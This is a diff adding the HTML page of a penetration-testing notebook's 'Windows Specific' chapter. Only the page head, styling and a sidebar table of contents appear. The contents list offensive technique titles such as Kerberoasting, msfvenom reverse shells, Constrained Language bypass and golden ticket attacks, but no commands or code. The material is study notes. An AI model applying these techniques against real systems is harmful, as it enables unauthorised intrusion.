@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="" xml:lang="">
+<head>
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>Windows Specific | 2021 - Hacking Notes</title>
+  <meta name="description" content="Full Pentest notebook" />
+  <meta name="generator" content="bookdown 0.21 and GitBook 2.6.7" />
+
+  <meta property="og:title" content="Windows Specific | 2021 - Hacking Notes" />
+  <meta property="og:type" content="book" />
+  
+  
+  <meta property="og:description" content="Full Pentest notebook" />
+  <meta name="github-repo" content="https://github.com/mlopez66/hacking-notes" />
+
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Windows Specific | 2021 - Hacking Notes" />
+  
+  <meta name="twitter:description" content="Full Pentest notebook" />
+  
+
+<meta name="author" content="Lo0pInG 404" />
+
+
+
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+  
+  
+<link rel="prev" href="gaining-access-with-metasploit.html"/>
+<link rel="next" href="linux-machine.html"/>
+<script src="libs/jquery-2.2.3/jquery.min.js"></script>
+<link href="libs/gitbook-2.6.7/css/style.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-table.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-bookdown.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-highlight.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-search.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-fontsettings.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-clipboard.css" rel="stylesheet" />
+
+
+
+
+
+
+
+
+
+<script src="libs/accessible-code-block-0.0.1/empty-anchor.js"></script>
+
+
+<style type="text/css">
+code.sourceCode > span { display: inline-block; line-height: 1.25; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode { white-space: pre; position: relative; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+code.sourceCode { white-space: pre-wrap; }
+code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    color: #aaaaaa;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+code span.at { color: #7d9029; } /* Attribute */
+code span.bn { color: #40a070; } /* BaseN */
+code span.bu { } /* BuiltIn */
+code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #4070a0; } /* Char */
+code span.cn { color: #880000; } /* Constant */
+code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+code span.dt { color: #902000; } /* DataType */
+code span.dv { color: #40a070; } /* DecVal */
+code span.er { color: #ff0000; font-weight: bold; } /* Error */
+code span.ex { } /* Extension */
+code span.fl { color: #40a070; } /* Float */
+code span.fu { color: #06287e; } /* Function */
+code span.im { } /* Import */
+code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+code span.op { color: #666666; } /* Operator */
+code span.ot { color: #007020; } /* Other */
+code span.pp { color: #bc7a00; } /* Preprocessor */
+code span.sc { color: #4070a0; } /* SpecialChar */
+code span.ss { color: #bb6688; } /* SpecialString */
+code span.st { color: #4070a0; } /* String */
+code span.va { color: #19177c; } /* Variable */
+code span.vs { color: #4070a0; } /* VerbatimString */
+code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+</style>
+
+<link rel="stylesheet" href="assets/gitbook.css" type="text/css" />
+</head>
+
+<body>
+
+
+
+  <div class="book without-animation with-summary font-size-2 font-family-1" data-basepath=".">
+
+    <div class="book-summary">
+      <nav role="navigation">
+
+<ul class="summary">
+<li class="header-light">
+  <a class="logo" href="/">
+    <img src="assets/wr404-transparent.png" alt="LoOpInG 404" class="img-fluid">
+  </a>
+  <h1>Lo0pInG 404</h1>
+</li>
+
+<li class="divider"></li>
+<li class="chapter" data-level="" data-path="index.html"><a href="index.html"><i class="fa fa-check"></i>Preface</a><ul>
+<li class="chapter" data-level="" data-path="index.html"><a href="index.html#introduction-1"><i class="fa fa-check"></i>Introduction</a></li>
+<li class="chapter" data-level="" data-path="index.html"><a href="index.html#acknoledgement-1"><i class="fa fa-check"></i>Acknoledgement</a></li>
+</ul></li>
+<li class="part"><span><b>I Information Gathering</b></span></li>
+<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html"><i class="fa fa-check"></i>Get Information from public sources</a><ul>
+<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#social-networks"><i class="fa fa-check"></i>Social Networks</a></li>
+<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#public-sites"><i class="fa fa-check"></i>Public sites</a></li>
+<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#whois"><i class="fa fa-check"></i>Whois</a></li>
+<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#check-personnal-victim-website"><i class="fa fa-check"></i>Check personnal victim website</a></li>
+<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#passive-enumeration"><i class="fa fa-check"></i>Passive Enumeration</a></li>
+</ul></li>
+<li class="part"><span><b>II Enumeration</b></span></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html"><i class="fa fa-check"></i>Server Enumeration</a><ul>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#ping-for-network-connectivity"><i class="fa fa-check"></i>Ping for Network connectivity</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#fping-to-enumerate-multiple-unknown-machines"><i class="fa fa-check"></i>fping to enumerate multiple unknown machines</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#nmap-for-machine-enumeration"><i class="fa fa-check"></i>NMAP for Machine Enumeration</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#port-scanner-with-bash"><i class="fa fa-check"></i>Port scanner with bash</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#use-specific-or-grouped-nmap-script-for-enumeration"><i class="fa fa-check"></i>Use specific or grouped nmap script for Enumeration</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#search-for-port-with-udp-protocol"><i class="fa fa-check"></i>Search for port with udp protocol</a><ul>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#get-snmp-community-string-with-onesixtyone"><i class="fa fa-check"></i>Get snmp community string with onesixtyone</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#enumerate-internal-services-and-processes-with-snmpwalk"><i class="fa fa-check"></i>Enumerate internal services and processes with snmpwalk</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#enumerate-internal-services-and-processed-with-nmap-scripts"><i class="fa fa-check"></i>Enumerate internal services and processed with nmap scripts</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#ipv6-enumeration"><i class="fa fa-check"></i>IPV6 enumeration</a><ul>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#ping-a-machine-with-its-ipv6-address"><i class="fa fa-check"></i>Ping a machine with it’s ipv6 address</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#enumerate-ports-with-nmap-with-the-ipv6-address"><i class="fa fa-check"></i>Enumerate ports with nmap with the ipv6 address</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#display-ipv6-web-app-on-the-web-browser"><i class="fa fa-check"></i>Display ipv6 web app on the web browser</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#pass-from-mac-address-to-ipv6-link-local-address"><i class="fa fa-check"></i>Pass from MAC address to IPV6 link local address</a></li>
+</ul></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html"><i class="fa fa-check"></i>Web Enumeration</a><ul>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#check-if-web-app-is-under-a-waf"><i class="fa fa-check"></i>Check if web app is under a WAF</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#nmap-http-scripting"><i class="fa fa-check"></i>Nmap http scripting</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#whatweb"><i class="fa fa-check"></i>Whatweb</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#create-a-dictionary-with-the-elements-in-a-website"><i class="fa fa-check"></i>Create a dictionary with the elements in a website</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#fuzzing-with-wfuzz"><i class="fa fa-check"></i>Fuzzing with WFUZZ</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#fuzzing-with-dirbuster"><i class="fa fa-check"></i>Fuzzing with Dirbuster</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#fuzzing-with-dirb"><i class="fa fa-check"></i>Fuzzing with Dirb</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#wpscan-for-wordpress-webapps"><i class="fa fa-check"></i>WPScan for wordpress webapps</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#inspect-ssl-certificate"><i class="fa fa-check"></i>Inspect SSL certificate</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#use-curl-to-retrieve-user-or-information-in-the-webapp"><i class="fa fa-check"></i>Use curl to retrieve user or information in the webapp</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="steganography.html"><a href="steganography.html"><i class="fa fa-check"></i>Steganography</a><ul>
+<li class="chapter" data-level="" data-path="steganography.html"><a href="steganography.html#look-at-info-with-file"><i class="fa fa-check"></i>Look at info with file</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html"><i class="fa fa-check"></i>Active Directory &amp; Windows Machines</a><ul>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#interesting-windows-ports"><i class="fa fa-check"></i>Interesting Windows ports</a></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#map-samba-exposed-shared-resources-with-smbmap"><i class="fa fa-check"></i>Map SAMBA exposed shared resources with smbmap</a></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#smb-connection-with-smbclient-and-smbmap"><i class="fa fa-check"></i>SMB connection with smbclient and smbmap</a></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#enumerate-machines-and-check-user-validity-by-samba-with-cme"><i class="fa fa-check"></i>Enumerate machines and check user validity by SAMBA with CME</a></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#sniffing-traffic-for-samba-relay-with-responder"><i class="fa fa-check"></i>Sniffing traffic for SAMBA Relay with responder</a></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#rpc-connection-with-rpcclient"><i class="fa fa-check"></i>RPC connection with rpcclient</a></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#enumerate-ldap-service-with-nmap"><i class="fa fa-check"></i>Enumerate ldap service with nmap</a></li>
+</ul></li>
+<li class="part"><span><b>III Vulnerabilies Assessment</b></span></li>
+<li class="chapter" data-level="" data-path="searching-for-exploits.html"><a href="searching-for-exploits.html"><i class="fa fa-check"></i>Searching for exploits</a><ul>
+<li class="chapter" data-level="" data-path="searching-for-exploits.html"><a href="searching-for-exploits.html#exploit-database"><i class="fa fa-check"></i>Exploit database</a></li>
+<li class="chapter" data-level="" data-path="searching-for-exploits.html"><a href="searching-for-exploits.html#searchsploit"><i class="fa fa-check"></i>Searchsploit</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html"><i class="fa fa-check"></i>Web Vulneratilities</a><ul>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#lfi-local-file-inclusion"><i class="fa fa-check"></i>LFI (Local File inclusion)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#wrappers"><i class="fa fa-check"></i>Wrappers</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#log-poisoning"><i class="fa fa-check"></i>Log Poisoning</a><ul>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#apache2"><i class="fa fa-check"></i>Apache2</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#ssh-logs"><i class="fa fa-check"></i>ssh logs</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#rfi-remote-file-inclusion"><i class="fa fa-check"></i>RFI (Remote File inclusion)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#html-injection"><i class="fa fa-check"></i>HTML Injection</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#xss-cross-site-scripting"><i class="fa fa-check"></i>XSS (Cross site scripting)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#xss-blind"><i class="fa fa-check"></i>XSS Blind</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#csrf-cross-site-request-forgery"><i class="fa fa-check"></i>CSRF (Cross-site Request Forgery)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#ssrf-server-side-request-forgery"><i class="fa fa-check"></i>SSRF (Server-Side Request Forgery)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#sql-injection---error-based"><i class="fa fa-check"></i>SQL Injection - Error Based</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#sql-injection---time-based"><i class="fa fa-check"></i>SQL Injection - Time Based</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#sql-injection---boolean-based"><i class="fa fa-check"></i>SQL Injection - Boolean Based</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#sqlmap"><i class="fa fa-check"></i>SQLMap</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#padding-oracle-attack-padbuster"><i class="fa fa-check"></i>Padding Oracle Attack (Padbuster)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#padding-oracle-attack-bit-flipper-attack---burpsuite"><i class="fa fa-check"></i>Padding Oracle Attack (Bit Flipper Attack - BurpSuite)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#shellshock"><i class="fa fa-check"></i>ShellShock</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#xxe-xml-external-entity-injection"><i class="fa fa-check"></i>XXE (XML External Entity Injection)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#blind-xxe"><i class="fa fa-check"></i>Blind XXE</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#domain-zone-transfer"><i class="fa fa-check"></i>Domain Zone Transfer</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#insecure-deserialization"><i class="fa fa-check"></i>Insecure Deserialization</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#type-juggling"><i class="fa fa-check"></i>Type Juggling</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#ssti"><i class="fa fa-check"></i>SSTI</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html"><i class="fa fa-check"></i>Windows vulnerability</a><ul>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#use-scf-file-to-get-the-ntlmv2-hash"><i class="fa fa-check"></i>Use scf file to get the NTLMv2 hash</a></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#active-directory-enumeration"><i class="fa fa-check"></i>Active Directory Enumeration</a><ul>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#injesting-bloodhound-from-the-attacker-machine"><i class="fa fa-check"></i>Injesting bloodhound from the attacker machine</a></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#injesting-bloodhound-from-the-victim"><i class="fa fa-check"></i>Injesting bloodhound from the victim</a></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#install-bloodhound-and-run-it"><i class="fa fa-check"></i>Install bloodhound and run it</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#asreproasing-on-kerberos"><i class="fa fa-check"></i>ASREPRoasing on Kerberos</a></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#kerberoasting-attack"><i class="fa fa-check"></i>Kerberoasting attack</a><ul>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#kerberoasting-attack-on-victim-machine-with-rubeus"><i class="fa fa-check"></i>Kerberoasting attack on victim machine with rubeus</a></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#kerberoasting-attack-from-attacker-machine-with-impacket-getuserspns"><i class="fa fa-check"></i>Kerberoasting attack from attacker machine with impacket-GetUserSPNs</a></li>
+</ul></li>
+</ul></li>
+<li class="part"><span><b>IV Vuln exploit &amp; Gaining Access</b></span></li>
+<li class="chapter" data-level="" data-path="beyond-remote-code-execution.html"><a href="beyond-remote-code-execution.html"><i class="fa fa-check"></i>Beyond Remote Code Execution</a></li>
+<li class="chapter" data-level="" data-path="checking-if-code-execution-occurs.html"><a href="checking-if-code-execution-occurs.html"><i class="fa fa-check"></i>Checking if code execution occurs</a><ul>
+<li class="chapter" data-level="" data-path="checking-if-code-execution-occurs.html"><a href="checking-if-code-execution-occurs.html#time-sleep-technic"><i class="fa fa-check"></i>Time sleep technic</a></li>
+<li class="chapter" data-level="" data-path="checking-if-code-execution-occurs.html"><a href="checking-if-code-execution-occurs.html#check-network-connectivity"><i class="fa fa-check"></i>Check network connectivity</a></li>
+<li class="chapter" data-level="" data-path="checking-if-code-execution-occurs.html"><a href="checking-if-code-execution-occurs.html#use-wget-and-netcat-to-execute-command"><i class="fa fa-check"></i>Use wget and netcat to execute command</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="visible-remote-code-execution.html"><a href="visible-remote-code-execution.html"><i class="fa fa-check"></i>Visible remote code execution</a></li>
+<li class="chapter" data-level="" data-path="gaining-access-throw-remote-code-execution.html"><a href="gaining-access-throw-remote-code-execution.html"><i class="fa fa-check"></i>Gaining access throw remote code execution</a><ul>
+<li class="chapter" data-level="" data-path="gaining-access-throw-remote-code-execution.html"><a href="gaining-access-throw-remote-code-execution.html#listen-and-connection-with-netcat"><i class="fa fa-check"></i>Listen and connection with netcat</a></li>
+<li class="chapter" data-level="" data-path="gaining-access-throw-remote-code-execution.html"><a href="gaining-access-throw-remote-code-execution.html#connection-with-curl"><i class="fa fa-check"></i>Connection with curl</a></li>
+<li class="chapter" data-level="" data-path="gaining-access-throw-remote-code-execution.html"><a href="gaining-access-throw-remote-code-execution.html#spawning-a-terminal-from-a-shell"><i class="fa fa-check"></i>Spawning a terminal from a shell</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="use-sql-injection-for-create-a-reverse-shell.html"><a href="use-sql-injection-for-create-a-reverse-shell.html"><i class="fa fa-check"></i>Use SQL Injection for create a reverse shell</a><ul>
+<li class="chapter" data-level="" data-path="use-sql-injection-for-create-a-reverse-shell.html"><a href="use-sql-injection-for-create-a-reverse-shell.html#postgresql"><i class="fa fa-check"></i>Postgresql</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html"><i class="fa fa-check"></i>Password Cracking</a><ul>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#password-cracking-with-johntheripper"><i class="fa fa-check"></i>Password Cracking with JohnTheRipper</a><ul>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#use-john-for-brute-force"><i class="fa fa-check"></i>Use John for brute force</a></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#use-john-for-dictionary-attack"><i class="fa fa-check"></i>Use John for dictionary attack</a></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#cracking-ssh-keys-protected-by-password"><i class="fa fa-check"></i>Cracking ssh keys protected by password</a></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#cracking-ftp-protected-by-password"><i class="fa fa-check"></i>Cracking ftp protected by password</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#use-websites-for-cracking-password"><i class="fa fa-check"></i>Use websites for cracking password</a></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#authentication-cracking"><i class="fa fa-check"></i>Authentication Cracking</a><ul>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#authentication-cracking-with-hydra"><i class="fa fa-check"></i>Authentication Cracking with Hydra</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#break-known-hash-algorithms-with-cyberchef"><i class="fa fa-check"></i>Break known hash algorithms with CyberChef</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="pivoting.html"><a href="pivoting.html"><i class="fa fa-check"></i>Pivoting</a><ul>
+<li class="chapter" data-level="" data-path="pivoting.html"><a href="pivoting.html#pivoting-with-chisel"><i class="fa fa-check"></i>Pivoting with chisel</a></li>
+<li class="chapter" data-level="" data-path="pivoting.html"><a href="pivoting.html#pivoting-with-socat"><i class="fa fa-check"></i>Pivoting with socat</a></li>
+<li class="chapter" data-level="" data-path="pivoting.html"><a href="pivoting.html#port-forwarding-with-ssh"><i class="fa fa-check"></i>Port forwarding with ssh</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="gaining-access-with-metasploit.html"><a href="gaining-access-with-metasploit.html"><i class="fa fa-check"></i>Gaining access with Metasploit</a><ul>
+<li class="chapter" data-level="" data-path="gaining-access-with-metasploit.html"><a href="gaining-access-with-metasploit.html#search-for-a-proper-exploit"><i class="fa fa-check"></i>Search for a proper exploit</a></li>
+<li class="chapter" data-level="" data-path="gaining-access-with-metasploit.html"><a href="gaining-access-with-metasploit.html#use-the-desired-exploit"><i class="fa fa-check"></i>Use the desired exploit</a></li>
+<li class="chapter" data-level="" data-path="gaining-access-with-metasploit.html"><a href="gaining-access-with-metasploit.html#run-the-exploit"><i class="fa fa-check"></i>Run the exploit</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html"><i class="fa fa-check"></i>Windows Specific</a><ul>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#ms-sql-server"><i class="fa fa-check"></i>MS SQL Server</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#connect-to-machine-with-psexec"><i class="fa fa-check"></i>Connect to machine with PSEXEC</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#send-files-to-windows-machine"><i class="fa fa-check"></i>Send files to windows machine</a><ul>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#download-files-with-certutil"><i class="fa fa-check"></i>Download files with certutil</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#download-files-by-using-powershell"><i class="fa fa-check"></i>Download files by using Powershell</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#share-smb-directory-with-windows-machine"><i class="fa fa-check"></i>Share SMB directory with Windows Machine</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#connection-throw-winrm-with-evil-winrm"><i class="fa fa-check"></i>Connection throw WinRM with evil-winrm</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#exploit-getchangesall-privilege-vulnerability"><i class="fa fa-check"></i>Exploit GetChangesAll privilege vulnerability</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#powershell-access-with-nishang"><i class="fa fa-check"></i>Powershell access with Nishang</a><ul>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#invoke-powershelltcp.ps1"><i class="fa fa-check"></i>Invoke-PowerShelltcp.ps1</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#create-a-reverse-shell-with-msfvenom"><i class="fa fa-check"></i>Create a reverse shell with msfvenom</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#bypass-constraint-language-in-a-powershell"><i class="fa fa-check"></i>Bypass Constraint Language in a PowerShell</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#shells-for-windows"><i class="fa fa-check"></i>Shells for windows</a><ul>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#php"><i class="fa fa-check"></i>PHP</a></li>
+</ul></li>
+</ul></li>
+<li class="part"><span><b>V Privilege Escalation</b></span></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html"><i class="fa fa-check"></i>Linux Machine</a><ul>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#writable-rights-in-etcpasswd"><i class="fa fa-check"></i>Writable rights in /etc/passwd</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#local-port-forwarding"><i class="fa fa-check"></i>Local Port forwarding</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#add-ssuid-privilege-to-tool"><i class="fa fa-check"></i>Add SSUID privilege to tool</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#path-hijacking"><i class="fa fa-check"></i>Path Hijacking</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#library-hijacking"><i class="fa fa-check"></i>Library Hijacking</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#wildcards"><i class="fa fa-check"></i>WildCards</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#linux-capabilities-exploitation"><i class="fa fa-check"></i>Linux capabilities exploitation</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#kernel-abuse"><i class="fa fa-check"></i>Kernel abuse</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html"><i class="fa fa-check"></i>Windows Machine</a><ul>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#active-directory"><i class="fa fa-check"></i>Active Directory</a><ul>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#golden-ticket-attack"><i class="fa fa-check"></i>Golden Ticket Attack</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#check-possible-privilege-escalation-vulnerabilities"><i class="fa fa-check"></i>Check possible privilege escalation vulnerabilities</a></li>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#check-command-history"><i class="fa fa-check"></i>Check command history</a></li>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#check-local-open-ports"><i class="fa fa-check"></i>Check local open ports</a></li>
